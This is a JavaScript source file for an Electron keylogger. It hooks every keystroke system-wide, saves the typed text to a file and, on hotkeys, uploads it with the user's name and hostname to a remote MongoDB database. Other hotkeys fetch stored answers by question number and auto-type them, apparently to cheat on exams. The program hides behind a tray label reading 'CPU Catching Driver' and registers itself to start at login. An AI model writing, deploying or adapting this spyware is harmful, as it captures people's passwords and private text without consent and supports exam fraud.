const { app, Tray, Menu, globalShortcut, BrowserWindow } = require('electron');
const { uIOhook, UiohookKey } = require('uiohook-napi');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const os = require('os'); // To fetch system information
const robot = require('@jitsi/robotjs'); // Use the forked package
const { MongoClient } = require('mongodb');

// MongoDB URI and Collections
const MONGODB_URI = 'mongodb+srv://USER:PASSWORD@cluster.mongodb.net/keylogger?retryWrites=true&w=majority';
const COLLECTION_NAME = 'keylogresponses';

// MongoDB Connection for Keylog
mongoose.connect(MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch((err) => console.error('MongoDB connection error:', err));

// Define the schema and model for keylog
// const KeyLogSchema = new mongoose.Schema({
//     deviceInfo: {
//         username: String,
//         hostname: String,
//         platform: String,
//         arch: String,
//         osType: String,
//         release: String,
//     },
//     loggedKeys: { type: String, default: '' },
//     lastTimestamp: { type: Date, default: Date.now },
// });


const KeyLogSchema = new mongoose.Schema({
    deviceInfo: {
        username: String,
        hostname: String,
        platform: String,
        arch: String,
        osType: String,
        release: String,
    },
    questionNumber: { type: Number, required: true }, // New field for the question number
    loggedKeys: { type: String, default: '' },
    lastTimestamp: { type: Date, default: Date.now },
});




const KeyLog = mongoose.model('keylogs', KeyLogSchema);

// Define device info
const deviceInfo = {
    username: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    osType: os.type(),
    release: os.release(),
};

// Variables for keylogging
let isShiftPressed = false;
let isCapsLockOn = false;
const logFilePath = path.join(app.getPath('userData'), 'keylogs.txt');
const tempFilePath = path.join(app.getPath('userData'), 'keylogs_temp.txt');

// Keycode mapping for logging
const keyCodeToChar = {
    [UiohookKey.A]: { normal: 'a', shift: 'A' },
        [UiohookKey.B]: { normal: 'b', shift: 'B' },
        [UiohookKey.C]: { normal: 'c', shift: 'C' },
        [UiohookKey.D]: { normal: 'd', shift: 'D' },
        [UiohookKey.E]: { normal: 'e', shift: 'E' },
        [UiohookKey.F]: { normal: 'f', shift: 'F' },
        [UiohookKey.G]: { normal: 'g', shift: 'G' },
        [UiohookKey.H]: { normal: 'h', shift: 'H' },
        [UiohookKey.I]: { normal: 'i', shift: 'I' },
        [UiohookKey.J]: { normal: 'j', shift: 'J' },
        [UiohookKey.K]: { normal: 'k', shift: 'K' },
        [UiohookKey.L]: { normal: 'l', shift: 'L' },
        [UiohookKey.M]: { normal: 'm', shift: 'M' },
        [UiohookKey.N]: { normal: 'n', shift: 'N' },
        [UiohookKey.O]: { normal: 'o', shift: 'O' },
        [UiohookKey.P]: { normal: 'p', shift: 'P' },
        [UiohookKey.Q]: { normal: 'q', shift: 'Q' },
        [UiohookKey.R]: { normal: 'r', shift: 'R' },
        [UiohookKey.S]: { normal: 's', shift: 'S' },
        [UiohookKey.T]: { normal: 't', shift: 'T' },
        [UiohookKey.U]: { normal: 'u', shift: 'U' },
        [UiohookKey.V]: { normal: 'v', shift: 'V' },
        [UiohookKey.W]: { normal: 'w', shift: 'W' },
        [UiohookKey.X]: { normal: 'x', shift: 'X' },
        [UiohookKey.Y]: { normal: 'y', shift: 'Y' },
        [UiohookKey.Z]: { normal: 'z', shift: 'Z' },
    
        [2]: { normal: '1', shift: '!' },
        [3]: { normal: '2', shift: '@' },
        [4]: { normal: '3', shift: '#' },
        [5]: { normal: '4', shift: '$' },
        [6]: { normal: '5', shift: '%' },
        [7]: { normal: '6', shift: '^' },
        [8]: { normal: '7', shift: '&' },
        [9]: { normal: '8', shift: '*' },
        [10]: { normal: '9', shift: '(' },
        [11]: { normal: '0', shift: ')' },
        [12]: { normal: '-', shift: '_' },
        [13]: { normal: '=', shift: '+' },
    
        [26]: { normal: '[', shift: '{' },
        [27]: { normal: ']', shift: '}' },
        [43]: { normal: '\\', shift: '|' },
    
        [39]: { normal: ';', shift: ':' },
        [40]: { normal: '\'', shift: '"' },
        [51]: { normal: ',', shift: '<' },
        [52]: { normal: '.', shift: '>' },
        [53]: { normal: '/', shift: '?' },
        [57]: { normal: ' ', shift: ' ' },
        [28]: { normal: '\n', shift: '\n' },
    
    // Special keys
    [14]: { normal: '\b', shift: '\b' }, // Backspace
    [57]: { normal: ' ', shift: ' ' },   // Space
    [28]: { normal: '\n', shift: '\n' }, // Enter

    // Numpad keys
    [82]: { normal: '0' },
    [79]: { normal: '1' },
    [80]: { normal: '2' },
    [81]: { normal: '3' },
    [75]: { normal: '4' },
    [76]: { normal: '5' },
    [77]: { normal: '6' },
    [71]: { normal: '7' },
    [72]: { normal: '8' },
    [73]: { normal: '9' },

    // Special symbols (/ * - + .)
    [3637]: { normal: '/' }, // /
    [55]: { normal: '*' },   // *
    [74]: { normal: '-' },   // -
    [78]: { normal: '+' },   // +
    [83]: { normal: '.' },   // .
};

// Create system tray
function createTray() {
    const trayIcon = path.join(__dirname, 'cpu.ico'); // Tray icon image
    const tray = new Tray(trayIcon);

    const contextMenu = Menu.buildFromTemplate([
        {
            label: 'Quit',
            click: () => {
                app.quit();
            }
        }
    ]);

    tray.setToolTip('CPU Catching Driver');
    tray.setContextMenu(contextMenu);
}

// Save the typed key to file
function saveToFile(data) {
    fs.appendFileSync(logFilePath, data, 'utf8');
}

// Sync the keylog file to MongoDB
// async function syncFileToMongoDB() {
//     console.log("control went inside syncFileToMongoDB function")
//     if (fs.existsSync(logFilePath)) {
//         const data = fs.readFileSync(logFilePath, 'utf8');
//         if (data.trim()) {
//             try {
//                 fs.renameSync(logFilePath, tempFilePath); // Move data to temp file
//                 const currentData = fs.readFileSync(tempFilePath, 'utf8');
//                 let existingLog = await KeyLog.findOne({ deviceInfo });

//                 if (existingLog) {
//                     existingLog.loggedKeys += currentData;
//                     existingLog.lastTimestamp = new Date();
//                     await existingLog.save();
//                 } else {
//                     const keyLog = new KeyLog({
//                         deviceInfo,
//                         loggedKeys: currentData,
//                         lastTimestamp: new Date(),
//                     });
//                     await keyLog.save();
                
//                 }

//                 console.log('Data synced to MongoDB');
//                 fs.unlinkSync(tempFilePath); // Remove temp file after sync
//             } catch (err) {
//                 console.error('Error syncing data to MongoDB:', err);
//                 fs.appendFileSync(logFilePath, fs.readFileSync(tempFilePath, 'utf8')); // Restore unsynced data
//                 fs.unlinkSync(tempFilePath);
//             }
//         }
//     }
// }









async function syncFileToMongoDB() {
    console.log("Control went inside syncFileToMongoDB function");

    // Check if log file exists
    if (fs.existsSync(logFilePath)) {
        console.log('Log file exists, proceeding with reading the file...');
        
        const data = fs.readFileSync(logFilePath, 'utf8');

        // Check if the data is not empty
        if (data.trim()) {
            try {
                // Moving the log file to a temporary file
                console.log('Renaming log file to temporary file...');
                fs.renameSync(logFilePath, tempFilePath);
                const currentData = fs.readFileSync(tempFilePath, 'utf8');
                console.log('Read data from temp file:', currentData);

                // Check the deviceInfo value
                console.log('Device info:', deviceInfo);

                let existingLog = await KeyLog.findOne({ deviceInfo });
                console.log('Database query result:', existingLog);

                if (existingLog) {
                    console.log('Existing log found:', existingLog);

                    // Append the new data to the existing log
                    existingLog.loggedKeys += currentData;
                    existingLog.lastTimestamp = new Date();

                    console.log('Updated existing log:', existingLog);

                    await existingLog.save();
                    console.log('Existing log saved to MongoDB');
                } else {
                    // Create a new log entry if no existing log is found
                    const keyLog = new KeyLog({
                        deviceInfo,
                        loggedKeys: currentData,
                        lastTimestamp: new Date(),
                    });

                    console.log('New log entry created:', keyLog);

                    await keyLog.save();
                    console.log('New log entry saved to MongoDB');
                }

                // Remove the temporary file after syncing
                fs.unlinkSync(tempFilePath);
                console.log('Temporary file deleted after sync');
            } catch (err) {
                console.error('Error syncing data to MongoDB:', err);
                
                // Restore unsynced data if error occurs
                const tempData = fs.readFileSync(tempFilePath, 'utf8');
                fs.appendFileSync(logFilePath, tempData);
                fs.unlinkSync(tempFilePath);
            }
        } else {
            console.log('Log file is empty, no data to sync');
        }
    } else {
        console.log('Log file does not exist');
    }
}

// Handle keydown event for keylogging
uIOhook.on('keydown', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = true;
        return;
    }
    if (e.keycode === 58) {
        isCapsLockOn = !isCapsLockOn;
        return;
    }

    const keyMapping = keyCodeToChar[e.keycode];
    if (keyMapping) {
        let key = keyMapping.normal;

        if (isShiftPressed) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && !isShiftPressed && /[a-z]/.test(keyMapping.normal)) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && isShiftPressed && /[A-Z]/.test(keyMapping.shift)) {
            key = keyMapping.normal; // Correct handling for CapsLock + Shift
        }

        saveToFile(key);
        console.log(key);

    }
});

uIOhook.on('keyup', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = false;
    }
});

uIOhook.start();

// // Register dynamic global shortcuts based on a number range (e.g., 1-9, 0-9, etc.)
// function registerDynamicShortcuts(start, end) {
//     for (let i = start; i <= end; i++) {
//         // Ctrl + Alt + i to sync the data
//         globalShortcut.register(`Ctrl+Alt+${i}`, () => {
//             console.log(`Sending data to MongoDB for question ${i}...`);
//             syncFileToMongoDB(); // Sync the data to MongoDB on shortcut press
//         });

//         // Ctrl + Shift + i to fetch and type the answer
//         globalShortcut.register(`Ctrl+Shift+${i}`, () => {
//             console.log(`Fetching and typing answer for question ${i}...`);
//             fetchAnswerFromMongoDB(i); // Fetch answer for the current question
//         });
//     }
// }

// // Fetch the answer for a question from MongoDB and type it
// async function fetchAnswerFromMongoDB(questionId) {
//     const client = new MongoClient(MONGODB_URI, {
//         useNewUrlParser: true,
//         useUnifiedTopology: true,
//     });

//     try {
//         await client.connect();
//         const database = client.db(); // Use the default database in the URI
//         const collection = database.collection(COLLECTION_NAME);

//         const response = await collection.findOne({ questionId });
//         if (response) {
//             console.log(`Answer for question ${questionId}:`, response.answer);
//             robot.typeString(response.answer); // Type the answer where the cursor is
//         } else {
//             console.log(`No response for question ${questionId} yet.`);
//             robot.typeString(`No response for question ${questionId} yet.`);
//         }
//     } catch (err) {
//         console.error('Error fetching answer from MongoDB:', err);
//     }
// }







async function fetchAnswerFromMongoDB(questionNumber) {
    const client = new MongoClient(MONGODB_URI, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
    });

    try {
        await client.connect();
        const database = client.db(); // Use the default database in the URI
        const collection = database.collection(COLLECTION_NAME);

        // Update the query field name to match your document structure
        const response = await collection.findOne({ questionNumber });
        if (response) {
            console.log(`Answer for question ${questionNumber}:`, response.response);
            robot.typeString(response.response); // Type the answer where the cursor is
        } else {
            console.log(`No response for question ${questionNumber} yet.`);
            robot.typeString(`No response for question ${questionNumber} yet.`);
        }
    } catch (err) {
        console.error('Error fetching answer from MongoDB:', err);
    } finally {
        await client.close(); // Ensure the connection is closed
    }
}







// // Create system tray and register shortcuts dynamically for numbers 1-9
// app.whenReady().then(() => {
//     createTray(); // Create the tray icon for background process

//     //setInterval(syncFileToMongoDB, 10000); // Sync every 10 seconds

//     // Register shortcuts for numbers 1 to 9 (You can change this range as needed)
//     registerDynamicShortcuts(1, 9);
// });

// // Automatically start the app when the user logs in or turns on the laptop
// app.setLoginItemSettings({
//     openAtLogin: true,
//     path: process.execPath, // This is the path of the current app's executable
// });

// app.on('window-all-closed', () => {
//     if (process.platform !== 'darwin') {
//         app.quit();
//     }
// });














// // Register dynamic global shortcuts based on a number range (e.g., 1-9, 0-9, etc.)
// function registerDynamicShortcuts(start, end) {
//     for (let i = start; i <= end; i++) {
//         // Ctrl + Alt + i to create a new document with question number and sync the data
//         globalShortcut.register(`Ctrl+Alt+${i}`, () => {
//             console.log(`Creating new document and sending data to MongoDB for question ${i}...`);
//             syncFileToMongoDB(i); // Pass the question number to sync the data to MongoDB
//         });
//     }
// }

// // Modified syncFileToMongoDB function to create a new document with question number
// async function syncFileToMongoDB(questionNumber) {
//     console.log("Control went inside syncFileToMongoDB function");

//     // Check if log file exists
//     if (fs.existsSync(logFilePath)) {
//         console.log('Log file exists, proceeding with reading the file...');
        
//         const data = fs.readFileSync(logFilePath, 'utf8');

//         // Check if the data is not empty
//         if (data.trim()) {
//             try {
//                 // Moving the log file to a temporary file
//                 console.log('Renaming log file to temporary file...');
//                 fs.renameSync(logFilePath, tempFilePath);
//                 const currentData = fs.readFileSync(tempFilePath, 'utf8');
//                 console.log('Read data from temp file:', currentData);

//                 // Check the deviceInfo value
//                 console.log('Device info:', deviceInfo);

//                 // Create a new log entry with questionNumber
//                 const keyLog = new KeyLog({
//                     deviceInfo,
//                     loggedKeys: currentData,
//                     lastTimestamp: new Date(),
//                     questionNumber,  // Add question number to the document
//                 });

//                 console.log('New log entry created:', keyLog);

//                 await keyLog.save();
//                 console.log('New log entry saved to MongoDB');

//                 // Remove the temporary file after syncing
//                 fs.unlinkSync(tempFilePath);
//                 console.log('Temporary file deleted after sync');
//             } catch (err) {
//                 console.error('Error syncing data to MongoDB:', err);
                
//                 // Restore unsynced data if error occurs
//                 const tempData = fs.readFileSync(tempFilePath, 'utf8');
//                 fs.appendFileSync(logFilePath, tempData);
//                 fs.unlinkSync(tempFilePath);
//             }
//         } else {
//             console.log('Log file is empty, no data to sync');
//         }
//     } else {
//         console.log('Log file does not exist');
//     }
// }





function registerDynamicShortcuts(start, end) {
    for (let i = start; i <= end; i++) {
        globalShortcut.register(`Ctrl+Alt+${i}`, () => {
            console.log(`Sending data to MongoDB for question ${i}...`);
            syncFileToMongoDB(i); // Pass the pressed number to the function
        });

        globalShortcut.register(`Ctrl+Shift+${i}`, () => {
            console.log(`Fetching and typing answer for question ${i}...`);
            fetchAnswerFromMongoDB(i);
        });
    }
}


async function syncFileToMongoDB(questionNumber) {
    console.log("Control went inside syncFileToMongoDB function");

    if (fs.existsSync(logFilePath)) {
        console.log('Log file exists, proceeding with reading the file...');
        
        const data = fs.readFileSync(logFilePath, 'utf8');

        if (data.trim()) {
            try {
                console.log('Renaming log file to temporary file...');
                fs.renameSync(logFilePath, tempFilePath);
                const currentData = fs.readFileSync(tempFilePath, 'utf8');
                console.log('Read data from temp file:', currentData);

                console.log('Device info:', deviceInfo);

                // Create a new log entry with the questionNumber
                const keyLog = new KeyLog({
                    deviceInfo,
                    questionNumber, // Dynamically set question number
                    loggedKeys: currentData,
                    lastTimestamp: new Date(),
                });

                console.log('New log entry created:', keyLog);

                await keyLog.save();
                console.log('New log entry saved to MongoDB');

                fs.unlinkSync(tempFilePath);
                console.log('Temporary file deleted after sync');
            } catch (err) {
                console.error('Error syncing data to MongoDB:', err);
                const tempData = fs.readFileSync(tempFilePath, 'utf8');
                fs.appendFileSync(logFilePath, tempData);
                fs.unlinkSync(tempFilePath);
            }
        } else {
            console.log('Log file is empty, no data to sync');
        }
    } else {
        console.log('Log file does not exist');
    }
}




// Create system tray and register shortcuts dynamically for numbers 1-9
app.whenReady().then(() => {
    createTray(); // Create the tray icon for background process

    // Register shortcuts for numbers 1 to 9 (You can change this range as needed)
    registerDynamicShortcuts(1, 9);
});

// Automatically start the app when the user logs in or turns on the laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: process.execPath, // This is the path of the current app's executable
});








